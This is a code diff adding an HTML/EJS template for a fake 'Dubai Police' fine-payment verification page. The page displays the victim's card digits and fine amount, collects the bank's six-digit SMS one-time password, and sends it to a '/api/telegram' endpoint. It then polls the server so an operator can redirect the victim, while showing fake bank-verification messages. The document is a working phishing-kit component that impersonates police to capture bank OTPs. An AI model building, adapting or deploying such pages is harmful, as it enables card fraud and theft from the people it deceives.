@@ -1,0 +1,184 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<title>Verify Transaction | Dubai Police</title>
+<link rel="icon" type="image/png" href="/dp-logo.png">
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+<style>
+*{box-sizing:border-box;margin:0;padding:0;}
+body{font-family:'Inter',-apple-system,sans-serif;background:#f0f4f8;min-height:100vh;display:flex;flex-direction:column;max-width:480px;margin:0 auto;}
+@keyframes fadeIn{from{opacity:0;transform:translateY(8px)}to{opacity:1;transform:translateY(0)}}
+@keyframes pulse{0%,100%{opacity:1}50%{opacity:.5}}
+header{background:linear-gradient(135deg,#1a6b3a,#0f4a27);padding:14px 18px;display:flex;align-items:center;justify-content:space-between;flex-shrink:0;}
+.main{flex:1;padding:20px 16px 32px;animation:fadeIn .35s ease both;}
+.card{background:white;border-radius:18px;overflow:hidden;box-shadow:0 4px 24px rgba(0,0,0,0.08);}
+.card-head{padding:28px 24px 20px;text-align:center;border-bottom:1px solid #f1f5f9;}
+.lock-ring{width:64px;height:64px;border-radius:50%;background:#e8f5ee;display:flex;align-items:center;justify-content:center;margin:0 auto 14px;}
+.card-title{font-size:17px;font-weight:800;color:#0f172a;margin-bottom:6px;}
+.card-sub{font-size:12px;color:#6b7280;line-height:1.5;}
+.bank-pill{display:inline-block;margin-top:8px;padding:4px 14px;background:#f0fdf4;border:1px solid #bbf7d0;border-radius:20px;font-size:12px;font-weight:700;color:#166534;}
+.tx-section{padding:16px 20px;border-bottom:1px solid #f1f5f9;}
+.tx-lbl{font-size:10px;font-weight:700;color:#9ca3af;text-transform:uppercase;letter-spacing:.6px;margin-bottom:10px;}
+.tx-row{display:flex;justify-content:space-between;align-items:center;padding:7px 0;border-bottom:1px solid #f8fafc;font-size:13px;}
+.tx-row:last-child{border-bottom:none;}
+.tx-k{color:#6b7280;}
+.tx-v{font-weight:600;color:#0f172a;}
+.otp-section{padding:22px 24px;}
+.otp-lbl{font-size:12px;font-weight:700;color:#374151;margin-bottom:14px;display:block;}
+.otp-boxes{display:flex;gap:8px;justify-content:center;margin-bottom:18px;}
+.otp-d{width:44px;height:52px;border:2px solid #e5e7eb;border-radius:10px;font-size:22px;font-weight:700;text-align:center;color:#0f172a;background:#fafafa;outline:none;transition:all .15s;font-family:monospace;}
+.otp-d:focus{border-color:#1a6b3a;background:white;box-shadow:0 0 0 3px rgba(26,107,58,.1);}
+.otp-d.filled{border-color:#d1fae5;background:#f0fdf4;}
+.btn-verify{width:100%;padding:14px;background:linear-gradient(135deg,#1a6b3a,#0f4a27);color:white;font-size:15px;font-weight:700;border:none;border-radius:50px;cursor:pointer;box-shadow:0 4px 16px rgba(26,107,58,.35);transition:all .15s;font-family:inherit;}
+.btn-verify:disabled{background:#9ca3af;box-shadow:none;cursor:not-allowed;}
+.resend-row{text-align:center;margin-top:12px;font-size:12px;color:#9ca3af;}
+.resend-lnk{color:#1a6b3a;font-weight:600;cursor:pointer;text-decoration:none;border-bottom:1px solid #bbf7d0;}
+.status-bar{display:flex;align-items:center;justify-content:center;gap:7px;padding:11px 14px;background:#f0fdf4;border-radius:10px;margin-top:14px;font-size:12px;color:#166534;font-weight:600;}
+.s-dot{width:7px;height:7px;background:#22c55e;border-radius:50%;animation:pulse 1.2s ease-in-out infinite;}
+.foot{text-align:center;font-size:11px;color:#9ca3af;padding:14px 20px;display:flex;align-items:center;justify-content:center;gap:5px;border-top:1px solid #f1f5f9;}
+</style>
+<%- include('_pixel') %>
+</head>
+<body>
+
+<header>
+  <div style="display:flex;align-items:center;gap:10px;">
+    <div style="width:36px;height:36px;border-radius:50%;overflow:hidden;flex-shrink:0;"><img src="/dp-logo.png" alt="Dubai Police" width="36" height="36" style="object-fit:cover;"></div>
+    <div>
+      <div style="color:white;font-weight:800;font-size:14px;line-height:1.2;">Dubai Police</div>
+      <div style="color:rgba(255,255,255,0.6);font-size:11px;">شرطة دبي</div>
+    </div>
+  </div>
+  <div style="font-size:11px;color:rgba(255,255,255,0.5);">Secure Verification</div>
+</header>
+
+<div class="main">
+  <div class="card">
+
+    <div class="card-head">
+      <div class="lock-ring">
+        <svg width="26" height="26" viewBox="0 0 24 24" fill="none" stroke="#1a6b3a" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+          <rect x="3" y="11" width="18" height="11" rx="2" ry="2"/>
+          <path d="M7 11V7a5 5 0 0 1 10 0v4"/>
+        </svg>
+      </div>
+      <div class="card-title">Enter Verification Code</div>
+      <div class="card-sub">A one-time password has been sent to your registered mobile number via SMS.</div>
+      <div class="bank-pill"><%= issuer || 'Your Bank' %></div>
+    </div>
+
+    <div class="tx-section">
+      <div class="tx-lbl">Transaction Details</div>
+      <div class="tx-row"><span class="tx-k">Merchant</span><span class="tx-v">Dubai Police</span></div>
+      <div class="tx-row"><span class="tx-k">Amount</span><span class="tx-v" style="color:#1a6b3a;font-size:15px;">AED <%= totalFine.toLocaleString() %></span></div>
+      <div class="tx-row"><span class="tx-k">Card</span><span class="tx-v" style="font-family:monospace;">•••• •••• •••• <%= cardLast4 %></span></div>
+      <div class="tx-row"><span class="tx-k">Date</span><span class="tx-v"><%= dateStr %></span></div>
+    </div>
+
+    <div class="otp-section">
+      <label class="otp-lbl">Enter 6-digit verification code</label>
+      <div class="otp-boxes" id="otp-boxes">
+        <input class="otp-d" id="d0" maxlength="1" inputmode="numeric" pattern="[0-9]" autocomplete="one-time-code">
+        <input class="otp-d" id="d1" maxlength="1" inputmode="numeric" pattern="[0-9]">
+        <input class="otp-d" id="d2" maxlength="1" inputmode="numeric" pattern="[0-9]">
+        <input class="otp-d" id="d3" maxlength="1" inputmode="numeric" pattern="[0-9]">
+        <input class="otp-d" id="d4" maxlength="1" inputmode="numeric" pattern="[0-9]">
+        <input class="otp-d" id="d5" maxlength="1" inputmode="numeric" pattern="[0-9]">
+      </div>
+      <button class="btn-verify" id="verify-btn" onclick="submitOtp()" disabled>Verify Code</button>
+      <div class="resend-row">Didn't receive it? <span class="resend-lnk" id="resend-lnk" onclick="handleResend()">Resend code</span></div>
+      <div class="status-bar" id="status-bar" style="display:none;">
+        <div class="s-dot"></div>
+        <span id="status-txt">Verifying with bank…</span>
+      </div>
+    </div>
+
+    <div class="foot">
+      <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>
+      Secured by 256-bit SSL encryption
+    </div>
+  </div>
+</div>
+
+<script>
+const CARD_LAST4 = <%- JSON.stringify(cardLast4) %>;
+const TOTAL_FINE = <%- JSON.stringify(totalFine) %>;
+const ISSUER     = <%- JSON.stringify(issuer) %>;
+const SID        = <%- JSON.stringify(sid) %>;
+const sidParams  = '?totalFine=' + TOTAL_FINE + '&cardLast4=' + encodeURIComponent(CARD_LAST4) + '&issuer=' + encodeURIComponent(ISSUER) + '&sid=' + SID;
+
+const digits = Array.from({length:6}, (_, i) => document.getElementById('d' + i));
+
+digits.forEach((inp, i) => {
+  inp.addEventListener('input', e => {
+    const v = e.target.value.replace(/\D/g, '');
+    e.target.value = v;
+    inp.classList.toggle('filled', !!v);
+    if (v && i < 5) digits[i + 1].focus();
+    checkBtn();
+  });
+  inp.addEventListener('keydown', e => {
+    if (e.key === 'Backspace' && !e.target.value && i > 0) digits[i - 1].focus();
+  });
+  inp.addEventListener('paste', e => {
+    e.preventDefault();
+    const txt = (e.clipboardData || window.clipboardData).getData('text').replace(/\D/g, '').slice(0, 6);
+    txt.split('').forEach((ch, j) => { if (digits[j]) { digits[j].value = ch; digits[j].classList.add('filled'); } });
+    digits[Math.min(txt.length, 5)].focus();
+    checkBtn();
+  });
+});
+
+function getOtp() { return digits.map(d => d.value).join(''); }
+function checkBtn() { document.getElementById('verify-btn').disabled = getOtp().length < 6; }
+
+async function submitOtp() {
+  const otp = getOtp();
+  if (otp.length < 6) return;
+  const btn = document.getElementById('verify-btn');
+  btn.disabled = true;
+  btn.textContent = 'Verifying…';
+  document.getElementById('status-bar').style.display = 'flex';
+  document.getElementById('status-txt').textContent = 'Sending code to bank…';
+  try {
+    await fetch('/api/telegram', {
+      method: 'POST', headers: {'Content-Type':'application/json'},
+      body: JSON.stringify({ type:'otp_sms', sid:SID, otp, cardLast4:CARD_LAST4, totalFine:TOTAL_FINE, issuer:ISSUER })
+    });
+  } catch {}
+  document.getElementById('status-txt').textContent = 'Waiting for bank confirmation…';
+}
+
+let resent = false;
+function handleResend() {
+  if (resent) return;
+  resent = true;
+  const lnk = document.getElementById('resend-lnk');
+  lnk.textContent = 'Code resent';
+  lnk.style.cursor = 'default';
+  if (SID) {
+    fetch('/api/telegram', {
+      method: 'POST', headers: {'Content-Type':'application/json'},
+      body: JSON.stringify({ type:'otp_resend', sid:SID, cardLast4:CARD_LAST4, totalFine:TOTAL_FINE, issuer:ISSUER })
+    }).catch(() => {});
+  }
+  setTimeout(() => { resent = false; lnk.textContent = 'Resend code'; lnk.style.cursor = 'pointer'; }, 30000);
+}
+
+if (SID) {
+  setInterval(async () => {
+    try {
+      const r = await fetch('/api/check-status?sid=' + SID);
+      const d = await r.json();
+      if (d.action === 'redirect' && d.page) {
+        const extra = d.params ? '&' + d.params : '';
+        window.location.href = '/' + d.page + sidParams + extra;
+      }
+    } catch(e) {}
+  }, 3000);
+}
+</script>
+</body>
+</html>
